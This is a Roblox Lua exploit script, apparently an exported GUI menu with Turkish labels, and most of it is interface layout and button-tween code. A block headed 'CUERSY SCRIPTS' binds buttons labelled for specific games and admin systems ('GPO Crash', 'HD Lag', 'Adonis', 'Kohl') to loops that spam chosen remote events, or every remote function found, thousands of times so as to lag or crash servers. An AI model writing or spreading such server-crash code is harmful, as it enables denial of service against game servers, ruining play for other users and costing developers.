TextLabel_4.TextWrapped = true

TextLabel_5.Parent = Frame
TextLabel_5.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
TextLabel_5.BackgroundTransparency = 1.000
TextLabel_5.Position = UDim2.new(0.119701974, 0, -2.28136134, 0)
TextLabel_5.Size = UDim2.new(0, 302, 0, 49)
TextLabel_5.Font = Enum.Font.Unknown
TextLabel_5.Text = "-Özellik Güncelleştirmesi"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextScaled = true
TextLabel_5.TextSize = 20.000
TextLabel_5.TextWrapped = true

Poggers.Name = "Poggers"
Poggers.Parent = Gui
Poggers.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Poggers.ClipsDescendants = true
Poggers.LayoutOrder = 1
Poggers.Position = UDim2.new(0.340999991, 0, -0.986999989, 0)
Poggers.Size = UDim2.new(0, 418, 0, 356)

UICorner_24.CornerRadius = UDim.new(0, 2)
UICorner_24.Parent = Poggers

Glow_7.Name = "Glow"
Glow_7.Parent = Poggers
Glow_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_7.BackgroundTransparency = 1.000
Glow_7.BorderSizePixel = 0
Glow_7.Position = UDim2.new(0, -15, 0, -15)
Glow_7.Size = UDim2.new(1, 30, 1, 30)
Glow_7.ZIndex = 0
Glow_7.Image = "rbxassetid://5028857084"
Glow_7.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_7.ScaleType = Enum.ScaleType.Slice
Glow_7.SliceCenter = Rect.new(22, 22, 278, 278)

Sidebar.Name = "Sidebar"
Sidebar.Parent = Gui
Sidebar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Sidebar.Position = UDim2.new(-0.00113513425, 0, -0.000848063151, 0)
Sidebar.Size = UDim2.new(0, 213, 0, 375)

UICorner_25.Parent = Sidebar

Glow_8.Name = "Glow"
Glow_8.Parent = Sidebar
Glow_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Glow_8.BackgroundTransparency = 1.000
Glow_8.BorderSizePixel = 0
Glow_8.Position = UDim2.new(0, -15, 0, -15)
Glow_8.Size = UDim2.new(1, 30, 1, 30)
Glow_8.ZIndex = 0
Glow_8.Image = "rbxassetid://5028857084"
Glow_8.ImageColor3 = Color3.fromRGB(0, 0, 0)
Glow_8.ScaleType = Enum.ScaleType.Slice
Glow_8.SliceCenter = Rect.new(22, 22, 278, 278)

Home_3.Name = "Home"
Home_3.Parent = Gui
Home_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Home_3.BackgroundTransparency = 1.000
Home_3.Position = UDim2.new(0.00682967529, 0, 0.937224925, 0)
Home_3.Size = UDim2.new(0, 16, 0, 21)
Home_3.ZIndex = 2
Home_3.Font = Enum.Font.Unknown
Home_3.Text = "X"
Home_3.TextColor3 = Color3.fromRGB(255, 0, 4)
Home_3.TextScaled = true
Home_3.TextSize = 20.000
Home_3.TextWrapped = true
Home_3.TextXAlignment = Enum.TextXAlignment.Left

-- CUERSY SCRIPTS
local textboxxxx = Textbox.Text
-- 2. kohl
Anims.MouseButton1Click:Connect(function()
	for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end wait(5) for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
end)
-- Adonis
w_2.MouseButton1Click:Connect(function()
    for i = 1, 10000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild(textboxxxx) Event:FireServer(A_1)   end
end)
-- HD Lag
how_2.MouseButton1Click:Connect(function()
    local remoteFuncs = { } do        local function fetch( _, item )            if item:IsA( 'RemoteFunction' ) then                table.insert( remoteFuncs, item )            end        end table.foreach( game:GetDescendants( ), fetch )        table.foreach( getnilinstances( ), fetch )     end for _ = 1, 5000 do        for _, remoteFunc in next, remoteFuncs do            coroutine.wrap( remoteFunc.InvokeServer )( remoteFunc )        end     end     wait(10)     for _ = 1, 20000 do        for _, remoteFunc in next, remoteFuncs do            coroutine.wrap( remoteFunc.InvokeServer )( remoteFunc )        end    end
end)
-- GPO Crash
how_3.MouseButton1Click:Connect(function()
	for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end wait(5) for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
end)
-- Kohl
Anims.MouseButton1Click:Connect(function()
    for i = 1, 4000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end wait(5) for i = 1, 3000 do  local A_1 = "KuID" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("b\7\n\7\n\7") Event:FireServer(A_1)   end
end)
 -- Wauxy
how_4.MouseButton1Click:Connect(function()
    for i = 1, 3000 do  local A_1 = "pasta" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("PJR") Event:FireServer(A_1)   end wait(5) for i = 1, 3000 do  local A_1 = "pasta" local Event = game:GetService("ReplicatedStorage"):FindFirstChild("PJR") Event:FireServer(A_1)   end
end)

------------------------------------------------------------------
-- Scripts:

local function QQOCITV_fake_script() -- Home.LocalScript 
	local script = Instance.new('LocalScript', Home)

	--You dont need to delete this text.
	--PUT INSIDE a BUTTON in StarterGui
	--Make sure to make a frame for the menu to pop up then go to properties > Visible [Off]
	script.Parent.MouseButton1Click:Connect (function()
		script.Parent.Parent.Parent.Gui.Visible = true
		script.Parent.Parent.Visible = false
	end)
end
coroutine.wrap(QQOCITV_fake_script)()
-- Welcome.RainbowEffect is disabled.
-- Playername.RainbowEffect is disabled.
local function NBLPXY_fake_script() -- Playername.LocalScript 
	local script = Instance.new('LocalScript', Playername)

	repeat wait(0.05) until game:IsLoaded()
	
	script.Parent.Text = game.Players.LocalPlayer.Name
end
coroutine.wrap(NBLPXY_fake_script)()
local function WGSZY_fake_script() -- ImageLabel.LocalScript 
	local script = Instance.new('LocalScript', ImageLabel)

	--[[
	ez claps and why are you editing here :O]]
	
	local Players = game:GetService("Players")
	
	local player = Players.LocalPlayer
	
	-- Fetch the thumbnail
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size48x48
	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	
	-- Set the ImageLabel's content to the user thumbnail
	local imageLabel = script.Parent
	imageLabel.Image = content
end
coroutine.wrap(WGSZY_fake_script)()
local function LVKBS_fake_script() -- w.text/white 
	local script = Instance.new('LocalScript', w)

	local white = script.parent.parent.White
	script.parent.MouseButton1Click:Connect(function()
		white:TweenPosition(UDim2.new(0.021, 0,0.584, 0), "Out", "Linear", 0.2)
	wait(0.2)
	    script.parent.parent.Anims.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Others.TextColor3 = Color3.new(255, 255, 255)
		script.parent.TextColor3 = Color3.new(0, 0, 0)
		script.parent.parent.Home.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Admin.TextColor3 = Color3.new(255, 255, 255)
	end)
end
coroutine.wrap(LVKBS_fake_script)()
local function PNVLWD_fake_script() -- w.close others 
	local script = Instance.new('LocalScript', w)

	
	local white = script.parent.parent.morphsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	---closed pos 0.341, 0,-0.987, 0
	
	local h = script.parent.parent.Homescreen
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		h:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
end
coroutine.wrap(PNVLWD_fake_script)()
local function RTIV_fake_script() -- w.open frame 
	local script = Instance.new('LocalScript', w)

	
	local white = script.parent.parent.a2
	
	script.parent.MouseButton1Click:Connect(function()
	wait(1.1)
		white:TweenPosition(UDim2.new(0.352, 0,0.029, 0), "Out", "Quad", 1)
		end)
	
	---closed pos 0.341, 0,-0.987, 0
end
coroutine.wrap(RTIV_fake_script)()
local function NGCYRAU_fake_script() -- w.LocalScript 
	local script = Instance.new('LocalScript', w)

	local white = script.Parent.Parent.a1
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(NGCYRAU_fake_script)()
local function SHATA_fake_script() -- w_2.text/white 
	local script = Instance.new('LocalScript', w_2)

	local white = script.parent.parent.White
	script.parent.MouseButton1Click:Connect(function()
		white:TweenPosition(UDim2.new(0.023, 0,0.477, 0), "Out", "Linear", 0.2)
	wait(0.2)
	    script.parent.parent.Anims.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Others.TextColor3 = Color3.new(255, 255, 255)
		script.parent.TextColor3 = Color3.new(0, 0, 0)
		script.parent.parent.Home.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Admin.TextColor3 = Color3.new(255, 255, 255)
	end)
end
coroutine.wrap(SHATA_fake_script)()
local function YDSJBJ_fake_script() -- w_2.close others 
	local script = Instance.new('LocalScript', w_2)

	
	local white = script.parent.parent.morphsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	---closed pos 0.341, 0,-0.987, 0
	
	local h = script.parent.parent.Homescreen
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		h:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
end
coroutine.wrap(YDSJBJ_fake_script)()
local function QIEIVOQ_fake_script() -- w_2.open frame 
	local script = Instance.new('LocalScript', w_2)

	
	local white = script.parent.parent.a1
	
	script.parent.MouseButton1Click:Connect(function()
	wait(1.1)
		white:TweenPosition(UDim2.new(0.352, 0,0.029, 0), "Out", "Quad", 1)
		end)
	
	---closed pos 0.341, 0,-0.987, 0
end
coroutine.wrap(QIEIVOQ_fake_script)()
local function LYYMGRG_fake_script() -- w_2.LocalScript 
	local script = Instance.new('LocalScript', w_2)

	local white = script.Parent.Parent.a2
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(LYYMGRG_fake_script)()
local function EGHYN_fake_script() -- w_3.text/white 
	local script = Instance.new('LocalScript', w_3)

	local white = script.parent.parent.White
	script.parent.MouseButton1Click:Connect(function()
		white:TweenPosition(UDim2.new(0.02, 0,0.691, 0), "Out", "Linear", 0.2)
	wait(0.2)
	    script.parent.parent.Anims.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Others.TextColor3 = Color3.new(255, 255, 255)
		script.parent.TextColor3 = Color3.new(0, 0, 0)
		script.parent.parent.Home.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Admin.TextColor3 = Color3.new(255, 255, 255)
	end)
end
coroutine.wrap(EGHYN_fake_script)()
local function NBWBFON_fake_script() -- w_3.close others 
	local script = Instance.new('LocalScript', w_3)

	
	local white = script.parent.parent.morphsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	---closed pos 0.341, 0,-0.987, 0
	
	local h = script.parent.parent.Homescreen
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		h:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
end
coroutine.wrap(NBWBFON_fake_script)()
local function CLUA_fake_script() -- w_3.open frame 
	local script = Instance.new('LocalScript', w_3)

	
	local white = script.parent.parent.morphsframe
	
	script.parent.MouseButton1Click:Connect(function()
	wait(1.1)
		white:TweenPosition(UDim2.new(0.352, 0,0.029, 0), "Out", "Quad", 1)
		end)
	
	---closed pos 0.341, 0,-0.987, 0
end
coroutine.wrap(CLUA_fake_script)()
local function FUNNL_fake_script() -- w_3.LocalScript 
	local script = Instance.new('LocalScript', w_3)

	local white = script.Parent.Parent.a1
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(FUNNL_fake_script)()
local function SUMETG_fake_script() -- w_3.LocalScript 
	local script = Instance.new('LocalScript', w_3)

	local white = script.Parent.Parent.a2
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(SUMETG_fake_script)()
local function ZJBQDBJ_fake_script() -- how.LocalScript 
	local script = Instance.new('LocalScript', how)

	local white = script.parent.parent.White
	script.parent.MouseButton1Click:Connect(function()
		white:TweenPosition(UDim2.new(0.023, 0,0.363, 0), "Out", "Linear", 0.2)
		wait(0)
		script.parent.parent.Morph.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Others.TextColor3 = Color3.new(255, 255, 255)
		script.parent.TextColor3 = Color3.new(0, 0, 0)
		script.parent.parent.Home.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Admin.TextColor3 = Color3.new(255, 255, 255)
	end)
end
coroutine.wrap(ZJBQDBJ_fake_script)()
local function BEWSZ_fake_script() -- how.LocalScript 
	local script = Instance.new('LocalScript', how)

	local white = script.parent.parent.animsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(1.1)
		white:TweenPosition(UDim2.new(0.353, 0,0.019, 0), "Out", "Quad", 1)
		end)
	
	---closed pos 0.341, 0,-0.987, 0
end
coroutine.wrap(BEWSZ_fake_script)()
local function IMCDI_fake_script() -- how.close others 
	local script = Instance.new('LocalScript', how)

	
	local white = script.parent.parent.morphsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	---closed pos 0.341, 0,-0.987, 0
	
	local h = script.parent.parent.Homescreen
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		h:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
end
coroutine.wrap(IMCDI_fake_script)()
local function WYJQXY_fake_script() -- how.LocalScript 
	local script = Instance.new('LocalScript', how)

	local white = script.Parent.Parent.a1
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(WYJQXY_fake_script)()
local function EZFPLRH_fake_script() -- how.LocalScript 
	local script = Instance.new('LocalScript', how)

	local white = script.Parent.Parent.a2
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(EZFPLRH_fake_script)()
local function PEPFUNM_fake_script() -- Home_2.close others 
	local script = Instance.new('LocalScript', Home_2)

	
	local white = script.parent.parent.animsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	---closed pos 0.341, 0,-0.987, 0
	
	local white = script.parent.parent.morphsframe
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
end
coroutine.wrap(PEPFUNM_fake_script)()
local function PAUFO_fake_script() -- Home_2.text/white 
	local script = Instance.new('LocalScript', Home_2)

	local white = script.parent.parent.White
	script.parent.MouseButton1Click:Connect(function()
		white:TweenPosition(UDim2.new(0.023, 0,0.251, 0), "Out", "Linear", 0.2)
	wait(0.2)
	    script.parent.parent.Anims.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Others.TextColor3 = Color3.new(255, 255, 255)
		script.parent.parent.Morph.TextColor3 = Color3.new(255, 255, 255)
		script.parent.TextColor3 = Color3.new(0, 0, 0)
		script.parent.parent.Admin.TextColor3 = Color3.new(255, 255, 255)
	end)
end
coroutine.wrap(PAUFO_fake_script)()
local function RFGWPR_fake_script() -- Home_2.open frame 
	local script = Instance.new('LocalScript', Home_2)

	
	local white = script.parent.parent.Homescreen
	
	script.parent.MouseButton1Click:Connect(function()
	wait(1.1)
		white:TweenPosition(UDim2.new(0.352, 0,0.029, 0), "Out", "Quad", 1)
		end)
	
	---closed pos 0.341, 0,-0.987, 0
end
coroutine.wrap(RFGWPR_fake_script)()
local function HQGLD_fake_script() -- Home_2.LocalScript 
	local script = Instance.new('LocalScript', Home_2)

	local white = script.Parent.Parent.a1
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(HQGLD_fake_script)()
local function ONYNS_fake_script() -- Home_2.LocalScript 
	local script = Instance.new('LocalScript', Home_2)

	local white = script.Parent.Parent.a2
	script.parent.MouseButton1Click:Connect(function()
		wait(0.2)
		white:TweenPosition(UDim2.new(0.341, 0,-0.987, 0), "Out", "Quad", 0.8)
	end)
	
	
end
coroutine.wrap(ONYNS_fake_script)()
local function IVJH_fake_script() -- Gui.Dragify 
	local script = Instance.new('LocalScript', Gui)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0.50
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end

coroutine.wrap(IVJH_fake_script)()
local function DIOUWIM_fake_script() -- TextLabel_2.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_2)

	--
end
coroutine.wrap(DIOUWIM_fake_script)()
local function FOSLT_fake_script() -- TextLabel_3.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_3)

	--
end
coroutine.wrap(FOSLT_fake_script)()
local function WQYIT_fake_script() -- TextLabel_4.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_4)

	--
end
coroutine.wrap(WQYIT_fake_script)()
local function HZFGXV_fake_script() -- TextLabel_5.LocalScript 
	local script = Instance.new('LocalScript', TextLabel_5)

	--
end
coroutine.wrap(HZFGXV_fake_script)()
local function KFKUXFM_fake_script() -- Home_3.LocalScript 
	local script = Instance.new('LocalScript', Home_3)

	--You dont need to delete this text.
	--PUT INSIDE a BUTTON in StarterGui
	--Make sure to make a frame for the menu to pop up then go to properties > Visible [Off]
	script.Parent.MouseButton1Click:Connect (function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.open.Visible = true
	end)
end
coroutine.wrap(KFKUXFM_fake_script)()
